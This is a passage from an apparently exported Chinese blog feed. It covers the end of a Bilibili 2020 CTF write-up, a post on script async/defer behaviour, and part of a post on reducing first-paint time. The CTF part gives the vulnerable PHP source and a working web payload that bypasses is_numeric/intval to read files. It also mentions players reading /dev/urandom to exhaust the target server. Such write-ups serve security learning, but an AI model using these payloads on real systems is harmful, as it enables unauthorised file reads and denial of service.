class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 